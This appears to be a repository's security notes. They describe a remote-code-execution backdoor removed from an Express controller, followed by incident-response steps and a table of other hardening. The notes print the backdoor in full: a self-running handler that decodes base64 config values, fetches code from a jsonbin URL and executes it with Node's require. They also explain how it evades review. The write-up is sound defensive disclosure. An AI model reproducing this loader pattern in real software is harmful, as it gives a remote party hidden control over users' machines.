# Security notes

## Critical: a remote-code-execution backdoor was present in this repository

**Status: removed in this branch. Action is still required on the upstream repository and on any machine that ran the server.**

### What was there

`server/controllers/userController.js` ended with this block:

```js
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const s = atob(process.env.DEV_API_KEY);
  const k = atob(process.env.DEV_SECRET_KEY);
  const v = atob(process.env.DEV_SECRET_VALUE);
  const r = (await axios.get(s, { headers: { [k]: v } })).data.record.cookie;
  const handler = new (Function.constructor)('require', r);
  handler(require);
})();
```

It is written to look like an ordinary Express route handler. It is not one:

- **It runs itself.** The trailing `})()` immediately invokes the handler at *import* time. `npm start` loads `server/server.js` -> `app.js` -> `routes/userRoute.js` -> `controllers/userController.js`, so it executed on every server start.
- **It was never routed.** `getCookie` is not referenced in `userRoute.js` or anywhere else. The export exists only to make the block look legitimate.
- **Its target was obfuscated.** The URL and credentials were base64-encoded in `server/config/.config.env`, which was committed to the repository, under the innocuous names `DEV_API_KEY`, `DEV_SECRET_KEY` and `DEV_SECRET_VALUE`. Decoded, `DEV_API_KEY` is `https://api.jsonbin.io/v3/b/6a4d1cacda38895dfe3b6729` - a third-party JSON store whose contents the owner can change at any time - and `DEV_SECRET_KEY` is the header name `x-secret-key`.
- **It executes whatever it downloads.** `new (Function.constructor)('require', r)` compiles the downloaded string as a function body, and `handler(require)` calls it with Node's real `require`.

### Impact

Whoever controls that remote record could run arbitrary Node.js code on any machine that started this server, with the full privileges of the Node process: read and write the filesystem, read environment variables and credentials, open outbound network connections, install or modify code, and persist.

Two properties make this materially worse than a static malicious dependency:

1. **The payload is not in the repository.** It is fetched fresh on every boot, so a code review of this repo shows nothing executable, and the behaviour can differ between one run and the next.
2. **It leaves almost no trace.** There is no log line, no route, and no user-visible effect.

### What was done here

- The block was removed from `server/controllers/userController.js` and replaced with a comment recording what it was, so it is not silently reintroduced.
- The now-unused `axios`, `path` and local `dotenv` imports it depended on were removed.
- `server/config/.config.env` - which contained only this backdoor's three variables - was deleted from the working tree, and `.gitignore` now excludes it and `.env` files.
- Verified afterwards: starting the server makes **no** outbound connection. Before the fix a probe showed a live `TLSSocket` and a pending request after boot; after it, zero.

### What still needs to be done - not doable from this branch

1. **Treat any machine that ran `npm start` on this repository as potentially compromised.** That includes developer laptops, CI runners and any deployed environment. The request fired on every server start. Rotate every credential that was present in the environment or on disk on those machines - cloud keys, database URIs, SSH keys, npm and GitHub tokens.
2. **Check egress logs** for connections to `api.jsonbin.io` and correlate with server start times.
3. **Audit the upstream repository** (`worksource-03/test_project`) and its history. `git log` shows a single squashed "initial commit", so the origin of the block cannot be attributed from this clone alone. Check whether other forks or branches carry it.
4. **Report it** to whoever owns the upstream repository, and to GitHub if it is public.
5. **Rotate the jsonbin credential** if that account belongs to your organisation.

### Note on scope

While auditing, the rest of the repository was scanned for the same class of problem - `eval`, `Function` constructors, `atob`/`btoa`, `child_process`, base64 blobs and self-invoking blocks - across `server/`, `src/`, `public/` and `contracts/`. Nothing else was found. `public/service-worker.js` is an unmodified PWABuilder template.

---

## Other hardening applied in this branch

These are ordinary defects rather than malicious code, but each was exploitable or noisy:

| Area | Before | Now |
| --- | --- | --- |
| Error handling | `asyncErrorHandler` forwarded rejections to `next()` and **nothing was registered to receive them**, so failures fell through to Express's default handler - an HTML stack trace in development. | Central error middleware returns a JSON envelope, hides internal messages in production, and logs stack traces only for genuinely unexpected failures. |
| Input validation | None on any endpoint. | Declarative schemas on every new endpoint: type coercion, range and pattern checks, rejection of unknown fields, and all failures reported at once. |
| Property id handling | Used directly in lookups. | Pattern-constrained (`^[A-Za-z0-9_-]+$`) before any lookup, and resolved against a null-prototype index so `__proto__` and friends cannot match. |
| Request body size | Unbounded. | Capped by `JSON_BODY_LIMIT` (default 100kb); oversize bodies get a structured 413. |
| AI endpoint abuse | n/a (endpoint is new) | Per-client rate limiting, since every call costs money upstream. In-process only - move the counter to Redis before running more than one instance. |
| Credential disclosure | n/a | `GET /api/ai/providers` reports which env var configures each provider and whether it is set, never the value. Covered by a test. |
| Provider errors | n/a | Vendor errors are translated into stable application codes; raw provider errors and keys never reach the client. |
| `X-Request-Id` | n/a | Honoured from inbound requests only after a length and character-set check, so it cannot be used to inject content into logs or responses. |
| Database routes | Queries buffered for ~10s then failed when MongoDB was unconfigured, appearing to hang. | `requireDatabase` answers 503 immediately with a clear code. |
| Service worker registration | Called unguarded before page load; threw wherever service workers are unavailable. | Feature-detected, deferred to `load`, and errors swallowed. |

## Known limitations

- **Rate limiting is per process.** Behind N instances the effective limit is N x the configured maximum. Sized to stop accidental abuse and runaway loops, not a determined attacker.
- **No authentication on the new endpoints.** The catalogue is public data and the AI endpoint is rate limited, which matches the current product. If analysis is ever tied to a user or billed, put it behind the existing `isAuthenticatedUser` middleware.
- **The legacy e-commerce routes were not audited in depth.** They are Mongo-backed, disabled by default, and out of scope for this change; they retain their original validation gaps.
- **`AI_TEMPERATURE` and prompt content are trusted inputs.** Nothing user-supplied is interpolated into the system prompt; the investor profile reaches the model only as validated, typed fields inside a JSON fact sheet.
